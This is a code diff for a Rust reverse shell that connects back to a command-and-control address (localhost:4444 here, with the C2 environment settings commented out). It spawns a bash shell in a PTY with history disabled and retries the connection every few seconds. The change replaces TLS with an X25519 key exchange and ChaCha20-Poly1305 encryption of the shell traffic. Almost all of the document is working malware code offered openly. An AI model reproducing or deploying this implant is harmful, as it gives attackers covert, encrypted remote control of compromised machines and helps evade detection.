@@ -1,18 +1,25 @@
-use tokio::{
-    net::TcpStream as TokioTcpStream,
-    io::{AsyncReadExt, AsyncWriteExt}, // We use raw Read/Write, not BufRead/Line
-};
+use futures::{SinkExt, StreamExt};
 use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
 use std::io::{Read, Write}; // Standard sync IO traits for the PTY
-use tokio_native_tls::native_tls::TlsConnector;
+use tokio::{
+    io::{AsyncReadExt, AsyncWriteExt}, // We use raw Read/Write, not BufRead/Line
+    net::TcpStream as TokioTcpStream,
+};
+use tokio_util::codec::{FramedRead, FramedWrite};
 
+use chacha20poly1305::{ChaCha20Poly1305, KeyInit};
+use rand_core::OsRng;
+use x25519_dalek::{EphemeralSecret, PublicKey};
+
+mod codec;
+use codec::EncryptedCodec;
 
 #[tokio::main]
 async fn main() {
     loop {
         match reverse_shell().await {
-            Ok(_) => println!("Goodbye."),
-            Err(e) => eprintln!("Connection error: {}. Retrying in 5 seconds...", e),
+            Ok(_) => println!("[*] Goodbye."),
+            Err(e) => eprintln!("[!] Connection error: {}. Retrying in 5 seconds...", e),
         }
 
         tokio::time::sleep(std::time::Duration::from_secs(5)).await;
@@ -20,36 +27,49 @@ async fn main() {
 }
 
 async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
-    // socat openssl-listen:4444,cert=server.crt,key=server.key,verify=0 file:`tty`,raw,echo=0
-    let cx = TlsConnector::builder()
-        .danger_accept_invalid_certs(true)
-        .build()?;
-    let cx = tokio_native_tls::TlsConnector::from(cx);
-
     //const C2_ADDR: &str = env!("C2_ADDR");
     //const C2_PORT: &str = env!("C2_PORT");
 
-    let stream = TokioTcpStream::connect("127.0.0.1:4444").await?;
-    let stream = cx.connect("127.0.0.1", stream).await?;
-    let (mut tcp_reader, mut tcp_writer) = tokio::io::split(stream);
+    let mut stream = TokioTcpStream::connect("127.0.0.1:4444").await?;
+
+    let my_secret = EphemeralSecret::random_from_rng(OsRng);
+    let my_public = PublicKey::from(&my_secret);
+    stream.write_all(my_public.as_bytes()).await?;
+    let mut server_pub_bytes = [0u8; 32];
+    stream.read_exact(&mut server_pub_bytes).await?;
+    let server_public = PublicKey::from(server_pub_bytes);
+    let shared_secret = my_secret.diffie_hellman(&server_public);
+
+    let key = shared_secret.as_bytes();
+    let cipher_tx = ChaCha20Poly1305::new_from_slice(key).unwrap();
+    let cipher_rx = ChaCha20Poly1305::new_from_slice(key).unwrap();
+
+    let (tcp_reader, tcp_writer) = tokio::io::split(stream);
+    let mut frame_reader = FramedRead::new(tcp_reader, EncryptedCodec::new(cipher_rx));
+    let mut frame_writer = FramedWrite::new(tcp_writer, EncryptedCodec::new(cipher_tx));
 
     let pty_system = NativePtySystem::default();
-
     // TODO: For this, we would need a custom signaling protocol - we might look at this later
-    let pty_pair = pty_system.openpty(PtySize {
-        rows: 24, cols: 80, pixel_width: 0, pixel_height: 0,
-    }).expect("Failed to create PTY");
+    let pty_pair = pty_system
+        .openpty(PtySize {
+            rows: 24,
+            cols: 80,
+            pixel_width: 0,
+            pixel_height: 0,
+        })
+        .expect("Failed to create PTY");
 
     let mut _cmd = CommandBuilder::new("/bin/bash");
     _cmd.env("TERM", "xterm-256color");
     _cmd.env("PS1", "[V] \\u@\\h:\\w\\$ ");
     _cmd.env("HISTFILESIZE", "0");
-    let _bash = pty_pair.slave.spawn_command(_cmd).expect("Failed to spawn shell");
+    let _bash = pty_pair
+        .slave
+        .spawn_command(_cmd)
+        .expect("Failed to spawn shell");
 
-    // Get PTY handles (Blocking!)
-    let mut pty_reader = pty_pair.master.try_clone_reader().unwrap();
-    let mut pty_writer = pty_pair.master.take_writer().unwrap();
-
+    let mut pty_reader = pty_pair.master.try_clone_reader()?;
+    let mut pty_writer = pty_pair.master.take_writer()?;
     let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);
 
     tokio::task::spawn_blocking(move || {
@@ -64,23 +84,31 @@ async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
         }
     });
 
-    let mut tcp_buf = [0u8; 4096];
-
     loop {
         tokio::select! {
-            result = tcp_reader.read(&mut tcp_buf) => {
+            // Case 1: Network Packet Received (Already Decrypted by Codec)
+            // frame_reader.next() yields Option<Result<Vec<u8>>>
+            Some(result) = frame_reader.next() => {
                 match result {
-                    Ok(n) if n > 0 => {
-                        pty_writer.write_all(&tcp_buf[..n])?;
-                        pty_writer.flush()?; 
+                    Ok(data) => {
+                        // Write decrypted data to PTY
+                        pty_writer.write_all(&data)?;
+                        pty_writer.flush()?;
                     }
-                    _ => break,
+                    Err(e) => {
+                        eprintln!("[!] Network Error (Integrity/IO): {}", e);
+                        break;
+                    }
                 }
             }
 
+            // Case 2: PTY Data Received (From Blocking Thread)
             Some(data) = rx.recv() => {
-                tcp_writer.write_all(&data).await?;
-                tcp_writer.flush().await?;
+                // frame_writer.send() Encrypts + Frames the data automatically
+                if let Err(e) = frame_writer.send(data).await {
+                    eprintln!("[!] Failed to send packet: {}", e);
+                    break;
+                }
             }
         }
     }
